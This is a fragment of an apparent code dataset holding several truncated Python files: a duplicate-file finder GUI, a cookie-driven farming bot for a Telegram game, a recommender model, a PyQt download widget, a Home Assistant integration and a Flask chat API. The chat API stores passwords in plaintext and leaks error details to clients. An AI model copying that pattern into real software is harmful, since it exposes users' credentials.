(%):\"\n        )\n        threshold_label.grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)\n\n        self.threshold_var = tk.IntVar(value=80)\n        threshold_spin = ttk.Spinbox(\n            control_frame, from_=50, to=100, increment=5,\n            textvariable=self.threshold_var, width=5\n        )\n        threshold_spin.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)\n        self.create_tooltip(\n            threshold_spin, \"Set the similarity threshold for detecting duplicates\"\n        )\n\n        # Find duplicates button\n        find_button = ttk.Button(\n            control_frame, text=\"Find Duplicates\", command=self.find_duplicates_thread\n        )\n        find_button.grid(row=2, column=0, padx=5, pady=10, sticky=tk.W)\n        self.create_tooltip(\n            find_button, \"Start searching for duplicate files\"\n        )\n\n        # Progress bar\n        self.progress = ttk.Progressbar(\n            control_frame, orient=tk.HORIZONTAL, length=200, mode='determinate'\n        )\n        self.progress.grid(row=2, column=1, padx=5, pady=10, sticky=tk.W)\n\n        # Paned window for the treeview and preview panes\n        paned_window = ttk.PanedWindow(main_frame, orient=tk.HORIZONTAL)\n        paned_window.grid(row=1, column=0, sticky=\"nsew\")\n\n        # Treeview frame\n        tree_frame = ttk.Frame(paned_window)\n        paned_window.add(tree_frame, weight=1)\n\n        # Updated Treeview columns\n        columns = (\"Similarity %\", \"File Path\", \"Size\", \"Modified\")\n        self.tree = ttk.Treeview(\n            tree_frame, columns=columns, show='tree headings', selectmode='extended'\n        )\n        self.tree.heading(\"#0\", text=\"Group\")\n        for col in columns:\n            self.tree.heading(col, text=col)\n            if col == \"Similarity %\":\n                self.tree.column(col, anchor='center', width=100)\n            else:\n                self.tree.column(col, anchor='w', width=150)\n        self.tree.grid(row=0, column=0, sticky=\"nsew\")\n\n        # Scrollbars for the treeview\n        tree_scrollbar = ttk.Scrollbar(\n            tree_frame, orient=tk.VERTICAL, command=self.tree.yview\n        )\n        self.tree.configure(yscroll=tree_scrollbar.set)\n        tree_scrollbar.grid(row=0, column=1, sticky=\"ns\")\n\n        tree_scrollbar_horizontal = ttk.Scrollbar(\n            tree_frame, orient=tk.HORIZONTAL, command=self.tree.xview\n        )\n        self.tree.configure(xscroll=tree_scrollbar_horizontal.set)\n        tree_scrollbar_horizontal.grid(row=1, column=0, sticky=\"ew\")\n\n        # Bind selection event to update preview\n        self.tree.bind('<<TreeviewSelect>>', self.update_preview)\n\n        # Configure tree_frame\n        tree_frame.columnconfigure(0, weight=1)\n        tree_frame.rowconfigure(0, weight=1)\n\n        # Preview frame\n        preview_frame = ttk.Frame(paned_window)\n        paned_window.add(preview_frame, weight=1)\n\n        # File preview\n        file_label = ttk.Label(\n            preview_frame, text=\"File Preview\", font=self.bold_font\n  ",
    "from datetime import datetime\nimport json\nimport time\nfrom colorama import Fore\nimport requests\nimport random\n\n\nclass terminal:\n    BASE_URL = \"https://app.0xterminal.game/api/\"\n    HEADERS = {\n        \"accept\": \"*/*\",\n        \"accept-encoding\": \"gzip, deflate, br, zstd\",\n        \"accept-language\": \"en-GB,en;q=0.9,en-US;q=0.8\",\n        \"content-type\": \"application/json\",\n        \"priority\": \"u=1, i\",\n        \"referer\": \"https://app.0xterminal.game/app\",\n        \"sec-ch-ua\": '\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\", \"Microsoft Edge WebView2\";v=\"131\"',\n        \"sec-ch-ua-mobile\": \"?0\",\n        \"sec-ch-ua-platform\": '\"Windows\"',\n        \"sec-fetch-dest\": \"empty\",\n        \"sec-fetch-mode\": \"cors\",\n        \"sec-fetch-site\": \"same-origin\",\n        \"user-agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0\",\n        \"if-none-match\": 'W/\"21a-y+T53dCeOf899eNKEl1z3T7wCec\":',\n    }\n\n    def __init__(self):\n        self.query_list = self.load_query(\"query.txt\")\n        self.token = None\n        self.coins = 0\n\n    def banner(self) -> None:\n        \"\"\"Displays the banner for the bot.\"\"\"\n        self.log(\"\ud83c\udf89 Terminal Station Free Bot\", Fore.CYAN)\n        self.log(\"\ud83d\ude80 Created by LIVEXORDS\", Fore.CYAN)\n        self.log(\"\ud83d\udce2 Channel: t.me/livexordsscript\\n\", Fore.CYAN)\n\n    def log(self, message, color=Fore.RESET):\n        print(\n            Fore.LIGHTBLACK_EX\n            + datetime.now().strftime(\"[%Y:%m:%d ~ %H:%M:%S] |\")\n            + \" \"\n            + color\n            + message\n            + Fore.RESET\n        )\n\n    def load_config(self) -> dict:\n        \"\"\"Loads configuration from config.json.\"\"\"\n        try:\n            with open(\"config.json\", \"r\") as config_file:\n                return json.load(config_file)\n        except FileNotFoundError:\n            self.log(\"\u274c File config.json not found!\", Fore.RED)\n            return {}\n        except json.JSONDecodeError:\n            self.log(\"\u274c Error reading config.json!\", Fore.RED)\n            return {}\n\n    def load_query(self, path_file=\"query.txt\") -> list:\n        self.banner()\n\n        try:\n            with open(path_file, \"r\") as file:\n                queries = [line.strip() for line in file if line.strip()]\n\n            if not queries:\n                self.log(f\"\u26a0\ufe0f Warning: {path_file} is empty.\", Fore.YELLOW)\n\n            self.log(f\"\u2705 Loaded: {len(queries)} queries.\", Fore.GREEN)\n            return queries\n\n        except FileNotFoundError:\n            self.log(f\"\u274c File not found: {path_file}\", Fore.RED)\n            return []\n        except Exception as e:\n            self.log(f\"\u274c Error loading queries: {e}\", Fore.RED)\n            return []\n\n    def login(self, index: int) -> None:\n        self.log(\"\\U0001F512 Attempting to log in...\", Fore.GREEN)\n\n        if index >= len(self.query_list):\n            self.log(\"\\u274C Invalid login index. Please check again.\", Fore.RED)\n            return\n\n        req_url = f\"{self.BASE_URL}statistic/user\"\n        token = self.query_list[index]\n\n        self.log(\n            f\"\\U0001F4CB Using token: {token[:10]}... (truncated for security)\",\n            Fore.CYAN,\n        )\n\n        headers = {**self.HEADERS, \"cookie\": token}\n\n        try:\n            self.log(\n                \"\\U0001F4E1 Sending request to fetch user statistics...\",\n                Fore.CYAN,\n            )\n\n            response = requests.get(req_url, headers=headers)\n            if response.status_code == 304:\n                self.log(\"\\u26A0 Received status 304: Not Modified.\", Fore.YELLOW)\n                self.log(f\"Response: {response.text}\", Fore.YELLOW)\n                return\n\n            response.raise_for_status()\n            data = response.json()\n\n            info = data.get(\"info\", {})\n            stats = data.get(\"statistic\", {})\n            pack_stats = data.get(\"packStatistic\", {})\n            referral_stats = data.get(\"referralStatistic\", {})\n\n            username = info.get(\"telegram\", {}).get(\"username\", \"Unknown\")\n            telegram_id = info.get(\"telegram\", {}).get(\"id\", \"Unknown\")\n            ton_balance = stats.get(\"tonBalance\", \"0\")\n            terminal_balance = stats.get(\"terminalBalance\", 0)\n            next_harvest = stats.get(\"nextHarvestTimestamp\", \"Unknown\")\n            total_quests = stats.get(\"totalCompletedQuests\", 0)\n\n            self.token = token\n\n            self.log(\"\\u2705 Login successful!\", Fore.GREEN)\n            self.log(f\"\\U0001F464 Telegram Username: {username}\", Fore.LIGHTGREEN_EX)\n            self.log(f\"\\U0001F4F2 Telegram ID: {telegram_id}\", Fore.CYAN)\n            self.log(f\"\\U0001FA99 TON Balance: {ton_balance}\", Fore.LIGHTBLUE_EX)\n            self.log(\n                f\"\\U0001FA9A Terminal Balance: {terminal_balance}\", Fore.LIGHTMAGENTA_EX\n            )\n            self.log(\n                f\"\\U0001F4C5 Next Harvest Timestamp: {next_harvest}\", Fore.LIGHTCYAN_EX\n            )\n            self.log(\n            ",
    "# -*- coding: UTF-8 -*-\n# @Author  : Chenyang Wang\n# @Email   : THUwangcy@gmail.com\n\n\"\"\" ContraRec\nReference:\n    \"Sequential Recommendation with Multiple Contrast Signals\"\n    Wang et al., TOIS'2022.\nCMD example:\n    python main.py --model_name ContraRec --emb_size 64 --lr 1e-4 --l2 1e-6 --history_max 20 --encoder BERT4Rec \\\n    --num_neg 1 --ctc_temp 1 --ccc_temp 0.2 --batch_size 4096 --gamma 1 --dataset Grocery_and_Gourmet_Food\n\"\"\"\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport numpy as np\n\nfrom models.BaseModel import SequentialModel\nfrom utils import layers\n\n\nclass ContraRec(SequentialModel):\n    reader = 'SeqReader'\n    runner = 'BaseRunner'\n    extra_log_args = ['gamma', 'num_neg', 'batch_size', 'ctc_temp', 'ccc_temp', 'encoder']\n\n    @staticmethod\n    def parse_model_args(parser):\n        parser.add_argument('--emb_size', type=int, default=64,\n                            help='Size of embedding vectors.')\n        parser.add_argument('--gamma', type=float, default=1,\n                            help='Coefficient of the contrastive loss.')\n        parser.add_argument('--beta_a', type=int, default=3,\n                            help='Parameter of the beta distribution for sampling.')\n        parser.add_argument('--beta_b', type=int, default=3,\n                            help='Parameter of the beta distribution for sampling.')\n        parser.add_argument('--ctc_temp', type=float, default=1,\n                            help='Temperature in context-target contrastive loss.')\n        parser.add_argument('--ccc_temp', type=float, default=0.2,\n                            help='Temperature in context-context contrastive loss.')\n        parser.add_argument('--encoder', type=str, default='BERT4Rec',\n                            help='Choose a sequence encoder: GRU4Rec, Caser, BERT4Rec.')\n        return SequentialModel.parse_model_args(parser)\n\n    def __init__(self, args, corpus):\n        super().__init__(args, corpus)\n        self.emb_size = args.emb_size\n        self.max_his = args.history_max\n        self.gamma = args.gamma\n        self.beta_a = args.beta_a\n        self.beta_b = args.beta_b\n        self.ctc_temp = args.ctc_temp\n        self.ccc_temp = args.ccc_temp\n        self.encoder_name = args.encoder\n        self.mask_token = corpus.n_items\n        self._define_params()\n        self.apply(self.init_weights)\n\n    def _define_params(self):\n        self.i_embeddings = nn.Embedding(self.item_num + 1, self.emb_size)\n        if self.encoder_name == 'GRU4Rec':\n            self.encoder = GRU4RecEncoder(self.emb_size, hidden_size=128)\n        elif self.encoder_name == 'Caser':\n            self.encoder = CaserEncoder(self.emb_size, self.max_his, num_horizon=16, num_vertical=8, l=5)\n        elif self.encoder_name == 'BERT4Rec':\n            self.encoder = BERT4RecEncoder(self.emb_size, self.max_his, num_layers=2, num_heads=2)\n        else:\n            raise ValueError('Invalid sequence encoder.')\n        self.ccc_loss = ContraLoss(self.device, temperature=self.ccc_temp)\n\n    def forward(self, feed_dict):\n        self.check_list = []\n        i_ids = feed_dict['item_id']  # bsz, n_candidate\n        history = feed_dict['history_items']  # bsz, history_max\n        lengths = feed_dict['lengths']  # bsz\n\n        his_vectors = self.i_embeddings(history)\n        his_vector = self.encoder(his_vectors, lengths)\n        i_vectors = self.i_embeddings(i_ids)\n        prediction = (his_vector[:, None, :] * i_vectors).sum(-1)\n        out_dict = {'prediction': prediction}\n\n        if feed_dict['phase'] == 'train':\n            history_a = feed_dict['history_items_a']\n            his_a_vectors = self.i_embeddings(history_a)\n            his_a_vector = self.encoder(his_a_vectors, lengths)\n            history_b = feed_dict['history_items_b']\n            his_b_vectors = self.i_embeddings(history_b)\n            his_b_vector = self.encoder(his_b_vectors, lengths)\n            features = torch.stack([his_a_vector, his_b_vector], dim=1)  # bsz, 2, emb\n            features = F.normalize(features, dim=-1)\n            out_dict['features'] = features  # bsz, 2, emb\n            out_dict['labels'] = i_ids[:, 0]  # bsz\n\n        return out_dict\n\n    def loss(self, out_dict):\n        predictions = out_dict['prediction'] / self.ctc_temp\n        pre_softmax = (predictions - predictions.max()).softmax(dim=1)\n        ctc_loss = - self.ctc_temp * pre_softmax[:, 0].log().mean()\n        ccc_loss = self.ccc_loss(out_dict['features'], labels=out_dict['labels'])\n        loss = ctc_loss + self.gamma * ccc_loss\n        return loss\n\n    class Dataset(SequentialModel.Dataset):\n        def reorder_op(self, seq):\n            ratio = np.random.beta(a=self.model.beta_a, b=self.model.beta_b)\n            select_len = int(len(seq) * ratio)\n            start = np.random.randint(0, len(seq) - select_len + 1)\n            idx_range = np.arange(len(seq))\n            np.random.shuffle(idx_range[start: start + select_len])\n            return seq[idx_r",
    "from PyQt5.QtWidgets import QWidget, QHBoxLayout, QVBoxLayout, QLabel, QPushButton, QProgressBar\nfrom PyQt5.QtCore import QUrl\nfrom PyQt5.QtGui import QIcon, QDesktopServices\nfrom utils.helpers import format_file_size\n\nclass DownloadWidget(QWidget):\n    def __init__(self, download_item, parent=None):\n        super().__init__(parent)\n        self.download_item = download_item\n        layout = QHBoxLayout(self)\n        layout.setContentsMargins(10, 5, 10, 5)\n        \n        # File info\n        info_container = QWidget()\n        info_layout = QVBoxLayout(info_container)\n        info_layout.setContentsMargins(0, 0, 0, 0)\n        \n        # Filename\n        self.filename_label = QLabel(download_item.path().split('/')[-1])\n        self.filename_label.setStyleSheet(\"color: white; font-weight: bold;\")\n        info_layout.addWidget(self.filename_label)\n        \n        # Progress bar and status\n        progress_container = QWidget()\n        progress_layout = QHBoxLayout(progress_container)\n        progress_layout.setContentsMargins(0, 0, 0, 0)\n        \n        self.progress_bar = QProgressBar()\n        self.progress_bar.setStyleSheet(\"\"\"\n            QProgressBar {\n                border: 1px solid #3F3F44;\n                border-radius: 2px;\n                background: #2B2A33;\n                height: 20px;\n                text-align: center;\n            }\n            QProgressBar::chunk {\n                background-color: #0060DF;\n                border-radius: 2px;\n            }\n        \"\"\")\n        progress_layout.addWidget(self.progress_bar)\n        \n        self.status_label = QLabel(\"Starting...\")\n        self.status_label.setStyleSheet(\"color: #999;\")\n        progress_layout.addWidget(self.status_label)\n        \n        info_layout.addWidget(progress_container)\n        layout.addWidget(info_container)\n        \n        # Control buttons\n        button_container = QWidget()\n        button_layout = QHBoxLayout(button_container)\n        button_layout.setContentsMargins(0, 0, 0, 0)\n        button_layout.setSpacing(5)\n        \n        # Open folder button\n        self.open_folder_btn = QPushButton()\n        self.open_folder_btn.setIcon(QIcon(\"res/folder.png\"))\n        self.open_folder_btn.setToolTip(\"Open containing folder\")\n        self.open_folder_btn.clicked.connect(self.open_containing_folder)\n        self.open_folder_btn.setStyleSheet(\"\"\"\n            QPushButton {\n                background-color: transparent;\n                border: 1px solid #3F3F44;\n                border-radius: 4px;\n                padding: 5px;\n            }\n            QPushButton:hover {\n                background-color: #52525E;\n            }\n        \"\"\")\n        button_layout.addWidget(self.open_folder_btn)\n        \n        # Cancel/Remove button\n        self.cancel_btn = QPushButton()\n        self.cancel_btn.setIcon(QIcon(\"res/close.png\"))\n        self.cancel_btn.setToolTip(\"Cancel download\")\n        self.cancel_btn.clicked.connect(self.cancel_download)\n        self.cancel_btn.setStyleSheet(\"\"\"\n            QPushButton {\n                background-color: transparent;\n                border: 1px solid #3F3F44;\n                border-radius: 4px;\n                padding: 5px;\n            }\n            QPushButton:hover {\n                background-color: #52525E;\n            }\n        \"\"\")\n        button_layout.addWidget(self.cancel_btn)\n        \n        layout.addWidget(button_container)\n        \n        # Connect download signals\n        download_item.downloadProgress.connect(self.update_progress)\n        download_item.stateChanged.connect(self.update_state)\n        \n        self.setStyleSheet(\"\"\"\n            QWidget {\n                background-color: #1C1B22;\n                border-radius: 4px;\n            }\n        \"\"\")\n    \n    def update_progress(self, bytes_received, bytes_total):\n        \"\"\"Update the progress bar and status label.\"\"\"\n        progress = (bytes_received * 100) / bytes_total\n        self.progress_bar.setValue(int(progress))\n        \n        # Update status with file size\n        received_size = format_file_size(bytes_received)\n        total_size = format_file_size(bytes_total)\n        self.status_label.setText(f\"{received_size} of {total_size}\")\n    \n    def update_state(self, state):\n        \"\"\"Update the widget state based on download state.\"\"\"\n        from PyQt5.QtWebEngineWidgets import QWebEngineDownloadItem\n        \n        if state == QWebEngineDownloadItem.DownloadCompleted:\n            self.status_label.setText(\"Completed\")\n            self.status_label.setStyleSheet(\"color: #00C853;\")\n            self.cancel_btn.setIcon(QIcon(\"res/delete.png\"))\n            self.cancel_btn.setToolTip(\"Remove from list\")\n        elif state == QWebEngineDownloadItem.DownloadCancelled:\n            self.status_label.setText(\"Cancelled\")\n            self.status_label.setStyleSheet(\"color: #FF5252;\")\n        elif state == QWebEngineDownloadItem.DownloadInterrupted:\n            self.status_label.setText(\"Failed\")\n            ",
    "\"\"\"Ini\u021bializarea integr\u0103rii Curs valutar BNR.\"\"\"\nfrom datetime import datetime, time, timedelta\nfrom homeassistant.helpers.update_coordinator import DataUpdateCoordinator\nfrom homeassistant.helpers import config_validation as cv\nfrom homeassistant.helpers.entity import Entity\nimport asyncio\nimport logging\nimport aiohttp\nfrom .const import DOMAIN, DEFAULT_UPDATE_INTERVAL, URL\n\nCONFIG_SCHEMA = cv.config_entry_only_config_schema(DOMAIN)\n\n_LOGGER = logging.getLogger(__name__)\n\nclass AllDataCoordinator(DataUpdateCoordinator):\n    \"\"\"Coordinator unic pentru integrarea care aduce toate datele.\"\"\"\n\n    def __init__(self, hass, name, update_interval):\n        \"\"\"Ini\u021bializeaz\u0103 coordonatorul.\"\"\"\n        super().__init__(\n            hass,\n            _LOGGER,\n            name=name,\n            update_interval=timedelta(seconds=update_interval),\n        )\n        self._hass = hass\n        self._update_interval = update_interval\n        self._first_run = True  # Permite actualizarea la prima ini\u021biere\n\n    async def _async_update_data(self):\n        \"\"\"Actualizeaz\u0103 datele.\"\"\"\n        current_time = datetime.now().time()\n        start_time = time(13, 0)\n        end_time = time(17, 0)\n\n        if self._first_run:\n            _LOGGER.debug(\"Prima ini\u021biere - actualizarea datelor este permis\u0103.\")\n        elif not (start_time <= current_time <= end_time):\n            ora_curenta = datetime.now().strftime(\"%H:%M:%S\")\n            _LOGGER.debug(\n                \"Ora curent\u0103 (%s) este \u00een afara intervalului permis (13:00 - 17:00). Actualizarea datelor este oprit\u0103.\",\n                ora_curenta,\n            )\n            return self.data  # Return\u0103m datele existente f\u0103r\u0103 a face update\n\n        _LOGGER.debug(\"Ini\u021biem actualizarea datelor...\")\n        try:\n            updated_data = await self._fetch_all_data()\n            _LOGGER.debug(\"Actualizarea datelor a fost efectuat\u0103 cu succes.\")\n            self._first_run = False  # Set\u0103m _first_run la False dup\u0103 prima actualizare\n            return updated_data\n        except Exception as eroare:\n            _LOGGER.error(\"Eroare la actualizarea datelor: %s\", eroare)\n            raise eroare\n\n    async def _fetch_all_data(self):\n        \"\"\"Func\u021bie care preia toate datele necesare.\"\"\"\n        try:\n            async with aiohttp.ClientSession() as sesiune:\n                async with sesiune.get(URL) as raspuns:\n                    if raspuns.status != 200:\n                        _LOGGER.error(\n                            \"Eroare la desc\u0103rcarea datelor. Cod status HTTP: %s\",\n                            raspuns.status,\n                        )\n                        raise Exception(f\"Eroare HTTP {raspuns.status}\")\n                    date = await raspuns.json()\n                    _LOGGER.debug(\"Datele au fost preluate cu succes: %s\", date)\n                    return date\n        except Exception as eroare:\n            _LOGGER.error(\"A ap\u0103rut o eroare la preluarea datelor: %s\", eroare)\n            raise eroare\n\n# \u00cen fi\u0219ierul __init__.py, creeaz\u0103 coordonatorul global\nasync def async_setup_entry(hass, config_entry):\n    \"\"\"Configureaz\u0103 integrarea cu un singur coordonator.\"\"\"\n    hass.data.setdefault(DOMAIN, {})\n    update_interval = config_entry.options.get(\"scan_interval\", DEFAULT_UPDATE_INTERVAL)\n    coordinator = AllDataCoordinator(hass, name=DOMAIN, update_interval=update_interval)\n    await coordinator.async_config_entry_first_refresh()\n    \n    hass.data[DOMAIN][config_entry.entry_id] = coordinator\n    await hass.config_entries.async_forward_entry_setups(config_entry, [\"sensor\"])\n    \n    return True\n\nasync def async_unload_entry(hass, config_entry):\n    \"\"\"Dezactiveaz\u0103 integrarea.\"\"\"\n    unload_ok = await hass.config_entries.async_forward_entry_unload(config_entry, \"sensor\")\n    if unload_ok:\n        hass.data[DOMAIN].pop(config_entry.entry_id)\n\n    return unload_ok\n",
    "from flask import Flask\r\nfrom flask_restful import Api, Resource, reqparse\r\nimport sqlite3\r\nimport threading\r\nimport time\r\nimport os\r\n\r\napp = Flask(__name__)\r\napi = Api(app)\r\nfrom flask_cors import CORS\r\nCORS(app)\r\n\r\nconnect = sqlite3.connect('Chat.db', check_same_thread=False)\r\ncursor = connect.cursor()\r\ncursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS \r\n            users(\r\n               id INTEGER PRIMARY KEY,\r\n               name TEXT NOT NULL,\r\n               gmail TEXT NOT NULL,\r\n               password TEXT NOT NULL\r\n            )\"\"\")\r\n\r\ncursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS\r\n               mes(\r\n               name_sender TEXT NOT NULL,\r\n               name TEXT NOT NULL,\r\n               message TEXT NOT NULL,\r\n               timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)\"\"\")\r\n\r\ncursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS\r\n               ton(\r\n               name TEXT NOT NULL,\r\n               token TEXT NOT NULL\r\n               )\"\"\")\r\n\r\ncursor.execute('PRAGMA journal_mode = OFF')\r\nconnect.commit()\r\n\r\n\r\njournal_file = 'Chat.db-journal'\r\n\r\nif os.path.exists(journal_file):\r\n    os.remove(journal_file)\r\n\r\nclass Name_gmail(Resource):\r\n    def post(self):\r\n        try:\r\n            parser = reqparse.RequestParser()\r\n            parser.add_argument(\"name\", type=str, required=True, help=\"Name is required\")\r\n            parser.add_argument('gmail', type=str, required=True, help=\"Gmail is required\")\r\n            parser.add_argument('password', type=str, required=True, help=\"Password is required\")\r\n            args = parser.parse_args()\r\n\r\n            name = args[\"name\"]\r\n            gmail = args['gmail']\r\n            password = args['password']\r\n\r\n            cursor.execute(\"SELECT `name`, `gmail` FROM `users` WHERE `name` = ? AND `gmail` = ?\", (name, gmail))\r\n            data = cursor.fetchone()\r\n\r\n            if data is None:\r\n                cursor.execute(\"INSERT INTO users (name, gmail, password) VALUES (?, ?, ?);\", (name, gmail, password))\r\n                connect.commit()\r\n                return {'message': '\u0412\u044b \u0437\u0430\u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u043d\u044b'}, 200\r\n            else:\r\n                return {'message': '\u0422\u0430\u043a\u043e\u0439 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u0443\u0436\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442'}, 400\r\n        except sqlite3.Error as e:\r\n            connect.rollback()\r\n            return {'message': '\u041e\u0448\u0438\u0431\u043a\u0430 \u0431\u0430\u0437\u044b \u0434\u0430\u043d\u043d\u044b\u0445', 'error': str(e)}, 500\r\n        except Exception as e:\r\n            return {'message': '\u041f\u0440\u043e\u0438\u0437\u043e\u0448\u043b\u0430 \u043e\u0448\u0438\u0431\u043a\u0430', 'error': str(e)}, 500\r\n\r\n        \r\nclass Send_message(Resource):\r\n    def post(self):\r\n        try:\r\n            parser = reqparse.RequestParser()\r\n            parser.add_argument(\"name_sender\", type=str, required=True, help=\"Sender name is required\")\r\n            parser.add_argument(\"name\", type=str, required=True, help=\"Recipient name is required\")\r\n            parser.add_argument(\"message\", type=str, required=True, help=\"Message is required\")\r\n            parser.add_argument(\"token\", type=str, required=True, help=\"Token is required\")\r\n            args = parser.parse_args()\r\n\r\n            name_sender = args[\"name_sender\"]\r\n            name = args['name']\r\n            message = args['message']\r\n            token = args['token']\r\n\r\n            cursor.execute(\"SELECT name FROM users WHERE `name` = ?\", (name,))\r\n            recipient_exists = cursor.fetchone()\r\n\r\n            if recipient_exists:\r\n                cursor.execute(\"SELECT token FROM ton WHERE `token` = ?\", (token,))\r\n                token_valid = cursor.fetchone()\r\n\r\n                if token_valid:\r\n                    cursor.execute(\"INSERT INTO mes(name_sender, name, message) VALUES (?, ?, ?);\", \r\n                                   (name_sender, name, message))\r\n                    connect.commit()\r\n                    return {'message': '\u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u043e'}, 200\r\n                else:\r\n                    return {\"message\": \"\u0412\u044b \u043d\u0435 \u0432\u043e\u0448\u043b\u0438 \u0432 \u043f\u0440\u043e\u0444\u0438\u043b\u044c\"}, 400\r\n            else:\r\n                return {'message': \"\u041f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\"}, 400\r\n        except sqlite3.Error as e:\r\n            connect.rollback()\r\n            return {'message': '\u041e\u0448\u0438\u0431\u043a\u0430 \u0431\u0430\u0437\u044b \u0434\u0430\u043d\u043d\u044b\u0445', 'error': str(e)}, 500\r\n        except Exception as e:\r\n            return {'message': '\u041f\u0440\u043e\u0438\u0437\u043e\u0448\u043b\u0430 \u043e\u0448\u0438\u0431\u043a\u0430', 'error': str(e)}, 500\r\n\r\n\r\n\r\nclass Get_messages(Resource):\r\n    def get(self):\r\n        parser = reqparse.RequestParser()\r\n        parser.add_argument(\"token\", type=str)\r\n        args = parser.parse_args()\r\n        token = args['token']\r\n        cursor.execute('SELECT name FROM ton WHERE `token` = ?', (token,))\r\n        data = cursor.fetchone()\r\n        if data:\r\n            cursor.execute('SELECT name FROM ton WHERE `token` = ?', (token,))\r\n            name_sender = cursor.fetchone()\r\n            name_sender = name_sender[0]\r\n            cursor.execute(\"SELECT name_sender, message, timestamp FROM mes WHERE name = ?\", (name_sender,))\r\n            messages = cursor.fetchall()\r\n            if messages:\r\n                for msg in messages:\r\n                    messages_list = {'name_sender':msg[0], 'message':msg[1]}\r\n          ",
    "from framework.logger import get_logger\nfrom framework.plugin_manager.plugin import Plugin\nfrom framework.workflow_dispatcher.workflow_dispatcher import WorkflowDispatcher\nfrom .onebot_adapter.adapter import OneBotAdapter\nfrom .onebot_adapter.config import OneBotConfig\nfrom .onebot_adapter.workflows.admin_workflow import AdminWorkflow\n\nlogger = get_logger(\"OneBot-Adapter\")\n\n\nclass OneBotAdapterPlugin(Plugin):\n    def on_load(self):\n        class OneBotAdapterFactory:\n            def __init__(self, dispatcher: WorkflowDispatcher):\n                self.dispatcher = dispatcher\n\n            def __call__(self, config: OneBotConfig):\n                return OneBotAdapter(config, self.dispatcher)\n\n        self.im_registry.register(\n            \"onebot\",\n            OneBotAdapterFactory(self.workflow_dispatcher),\n            OneBotConfig\n        )\n\n        workflow = AdminWorkflow(self.event_bus)\n        logger.info(\"OneBotAdapter plugin loaded\")\n\n    def on_start(self):\n        logger.info(\"OneBotAdapter plugin started\")\n\n    def on_stop(self):\n        logger.info(\"OneBotAdapter plugin stopped\")",
    "# Menampilkan gambar ASCII (tengkorak Ghost Rider)\r\ndef print_ghost_rider():\r\n    print(\"\"\"\r\n\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591  \r\n\u2591\u2592\u2593\u2588\u2593\u2592\u2591     \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591     \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591 \r\n\u2591\u2592\u2593\u2588\u2593\u2592\u2591     \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591    \u2591\u2592\u2593\u2588\u2588\u2593\u2592\u2591       \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591       \u2591\u2592\u2593\u2588\u2593\u2592\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591     